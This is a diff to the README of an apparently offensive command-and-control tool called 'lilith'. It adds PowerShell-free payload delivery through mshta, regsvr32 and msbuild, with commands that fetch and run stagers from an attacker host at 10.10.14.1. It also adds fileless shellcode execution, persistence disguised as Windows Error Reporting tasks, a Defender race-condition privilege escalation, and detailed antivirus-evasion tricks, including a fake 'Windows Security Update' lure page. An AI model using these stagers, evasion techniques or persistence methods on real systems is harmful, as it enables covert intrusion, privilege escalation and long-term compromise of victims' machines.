@@ -360,6 +360,86 @@ powershell.exe -ep bypass
 ```
 Then paste the 10 lines above.
 
+> **PowerShell blocked?** Use `--lolbin` stagers instead — see section below.
+
+---
+
+## LOLBin stagers — PowerShell-free delivery (`--lolbin`)
+
+When `powershell.exe` is blocked by AppLocker, WDAC, or software restriction policy, three alternatives are available. None invoke `powershell.exe`.
+
+```bash
+python3 lilith.py build --runner            # required first
+python3 lilith.py build --lolbin mshta      # single mode
+python3 lilith.py build --lolbin regsvr32
+python3 lilith.py build --lolbin msbuild
+python3 lilith.py build --lolbin all        # generate all three
+```
+
+### mshta — HTA / VBScript
+
+Embeds the runner PE as base64 directly inside a self-contained `.hta` file. Runs entirely in-process via `mshta.exe` — no PowerShell, no temp `.ps1` on disk.
+
+```cmd
+mshta https://10.10.14.1:8443/cdn/static/v3/verify.hta
+
+rem Or drop the file first and run locally:
+mshta C:\Windows\Temp\verify.hta
+```
+
+**Evasion properties:**
+- VBScript variable names randomised per build
+- All COM object name strings split with `&` concatenation — no literal `"Microsoft.XMLDOM"`, `"ADODB.Stream"`, `"WScript.Shell"` or `"bin.base64"` in the file
+- Base64 payload split into 72-char chunks, no single giant string literal
+- PE written to `%TEMP%\wct<Hex(Timer)>.exe` (Windows Installer naming pattern), run hidden (`0`), detached (`False`)
+- HTA window: minimised, no taskbar entry, no title bar, `window.close` immediately after execution
+
+### regsvr32 — COM scriptlet (Squiblydoo)
+
+Embeds the runner PE in a signed `.sct` COM scriptlet fetched and executed by `scrobj.dll`.
+
+```cmd
+regsvr32 /s /n /u /i:https://10.10.14.1:8443/cdn/static/v3/service.sct scrobj.dll
+
+rem Self-signed cert → scrobj.dll rejects HTTPS. Use HTTP or pre-drop:
+regsvr32 /s /n /u /i:http://10.10.14.1:80/cdn/static/v3/service.sct scrobj.dll
+regsvr32 /s /n /u /i:C:\Windows\Temp\service.sct scrobj.dll
+```
+
+**Notes:**
+- `scrobj.dll` validates the TLS certificate chain — self-signed certs fail over HTTPS; use HTTP delivery or pre-drop the file
+- Obfuscation identical to mshta: split COM strings, randomised vars, chunked base64, CDATA wrapper
+- Random `progid` (6–12 random alpha chars) and `classid` (random 128-bit GUID) per build
+
+### msbuild — inline C# shellcode runner (fileless)
+
+Embeds the C2 agent shellcode (pack_enc format) directly in an MSBuild XML project file as a `CodeTaskFactory` inline C# task. MSBuild JIT-compiles and executes the C# — **no PE ever touches disk**.
+
+```cmd
+%WinDir%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\task.xml
+%WinDir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\task.xml
+```
+
+**Execution flow inside C#:**
+1. `Convert.FromBase64String()` recovers the `.enc` bytes
+2. Two-layer XOR decode (`k1 || xor(k2 || xor(sc, k2), k1)`) → raw shellcode
+3. `NtAllocateVirtualMemory` (RW) → `Marshal.Copy` → `NtProtectVirtualMemory` (RX) → `NtCreateThreadEx`
+4. No PE written to disk at any point
+
+**Notes:**
+- Requires `--runner` (and the C2 agent SC, built alongside the runner) — uses `runner_sc_c2.enc`, not the runner PE
+- Task class name and target name randomised per build
+- MSBuild is present on all Windows systems with .NET 4.x (installed by default since Win7 SP1)
+
+### LOLBin flags
+
+| Flag | Description |
+|---|---|
+| `--lolbin mshta` | Build `.hta` file + invoke command |
+| `--lolbin regsvr32` | Build `.sct` scriptlet + invoke command (HTTP preferred) |
+| `--lolbin msbuild` | Build `.xml` MSBuild project + invoke command (fileless) |
+| `--lolbin all` | Generate all three |
+
 ---
 
 ## USB HID delivery (`--usb`)
@@ -720,8 +800,11 @@ Install from an active C2 session. Each trigger re-downloads and re-executes the
 | `--persist run` | HKCU Run key | User logon | None |
 | `--persist schtask` | Scheduled task | User logon, HighestAvailable | None |
 | `--persist wmi` | WMI CommandLine Event Consumer | Interactive logon (explorer.exe start) | Admin / SYSTEM |
+| `--persist wer` | Scheduled task in `\Microsoft\Windows\Windows Error Reporting\` | System startup (ONSTART) | Admin / SYSTEM |
 
-All three embed the payload as base64 `-enc` — no plaintext URLs or PowerShell in registry/WMI at rest. Random name per install. Embedded payload is a compact XOR-obfuscated one-liner (~1.5 KB base64) that fetches and executes the C2 stager via `Net.Sockets.TcpClient` + `Net.Security.SslStream` — no WinHTTP COM activation event.
+`wer` blends the task into the WER infrastructure namespace — less monitored than root-folder scheduled tasks. Task name is randomised from a pool of WER-plausible names (`WerKernelReporting`, `AppCrashUpload`, `WatsonUploaderTask`, etc.).
+
+All four embed the payload as base64 `-enc` — no plaintext URLs or PowerShell in registry/WMI at rest. Random name per install. Embedded payload is a compact XOR-obfuscated one-liner (~1.5 KB base64) that fetches and executes the C2 stager via `Net.Sockets.TcpClient` + `Net.Security.SslStream` — no WinHTTP COM activation event.
 
 ```bash
 python3 lilith.py c2 --session <ID> --persist run
@@ -772,7 +855,11 @@ python3 lilith.py build --usb SharpUp --usb-device pico --usb-boot-delay 3000
 python3 lilith.py build --c2-stager --ble --ble-device bruce
 python3 lilith.py build --ble SharpUp --ble-device all
 
-# 6c. WASM browser dropper (browser-based delivery, AV evasion container)
+# 6c. LOLBin stagers (PowerShell-blocked environments)
+python3 lilith.py build --lolbin all        # mshta + regsvr32 + msbuild
+python3 lilith.py build --lolbin mshta      # HTA only
+
+# 6d. WASM browser dropper (browser-based delivery, AV evasion container)
 python3 lilith.py build --wasm --wasm-exe "SecurityUpdate.exe" --wasm-title "Windows Security Update"
 # → delivers install.html + runtime.<hex>.bin via lilith serve
 # → send URL to target: https://lhost:port/cdn/static/v3/install.html
@@ -839,6 +926,7 @@ python3 lilith.py engage --export json --out report.json       # JSON for SIEM/t
 | `PrintSpoofer32` | `-c cmd` | SeImpersonate → SYSTEM (x86 target) |
 | `JuicyPotato` | `-l 1337 -p cmd.exe -t *` | SeImpersonate → SYSTEM (pre-2019) |
 | `RoguePotato` | `-r LHOST -e cmd.exe -l 9999` | SeImpersonate → SYSTEM via OXID resolver |
+| `RoguePlanet` | *(no params)* | Windows Defender race condition → SYSTEM (Win10/11 only, no Server) |
 | `KrbRelayUp` | `full -m shadowcred` | Kerberos relay privilege escalation |
 | `Whisker` | `list` | Shadow Credentials abuse |
 | `Chisel` | `client LHOST:8081 R:socks` | SOCKS5 tunnel over HTTP |
@@ -871,6 +959,9 @@ All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set
 | `ble/` | BLE HID payload files (only if `--ble` was run) |
 | `<prefix>.<hex8>.bin` | WASM PE container (only if `--wasm` was run) |
 | `<name>.html` | WASM lure page (only if `--wasm` was run) |
+| `<name>.hta` | mshta HTA stager (only if `--lolbin mshta` was run) |
+| `<name>.sct` | regsvr32 SCT scriptlet (only if `--lolbin regsvr32` was run) |
+| `<name>.xml` | MSBuild inline C# stager (only if `--lolbin msbuild` was run) |
 
 ---
 
@@ -1094,6 +1185,9 @@ Commands are mapped to ATT&CK techniques at dispatch time. Examples:
 | USB HID | US keyboard layout only — non-US hosts mistype `$`, `{`, `@` etc. |
 | BLE HID | Requires one-time pairing on target; pairing event logged in Windows Bluetooth event log; ZWSP obfuscation stripped (BLE HID cannot transmit non-ASCII) |
 | Watchdog depth | One backup per primary; can produce several sessions on targets with many accessible processes |
+| regsvr32 LOLBin | `scrobj.dll` validates TLS cert chain — self-signed certs rejected over HTTPS; use HTTP delivery or pre-drop the `.sct` file |
+| msbuild LOLBin | Requires .NET 4.x MSBuild (present by default since Win7 SP1); `runner_sc_c2.enc` must exist (run `build --runner` first) |
+| RoguePlanet LPE | Windows 10/11 only — will not work on Windows Server; requires race condition timing (WD must be active and scanning) |
 
 ---
 
@@ -1177,6 +1271,8 @@ The watchdog immediately injects a backup agent. Expected behavior. Kill unwante
 - Potato chain spawns `powershell.exe` directly — no `cmd.exe` intermediary
 - USB HID payloads contain no hardcoded URLs or tool names — stager URL is XOR-encoded in the keystroke payload
 - WASM dropper: payload bytes exist as WASM bytecode on disk (no PE magic, no x64 opcodes); decryption happens inside WASM linear memory; filenames randomised per build to CDN chunk pattern — no "wasm/loader/payload" in paths
+- LOLBin stagers: all VBScript COM object strings split with `&` concatenation — no literal `"Microsoft.XMLDOM"`, `"ADODB.Stream"`, `"WScript.Shell"` in file; variable names randomised per build; msbuild uses inline C# with direct NT syscalls — no `VirtualAlloc`/`CreateRemoteThread` Win32 API, no IAT entries
+- WER persistence task name drawn from WER-infrastructure pool (`WerKernelReporting`, `AppCrashUpload`, etc.) — blends with legitimate WER task infrastructure; fires at ONSTART as SYSTEM
 
 ---
 
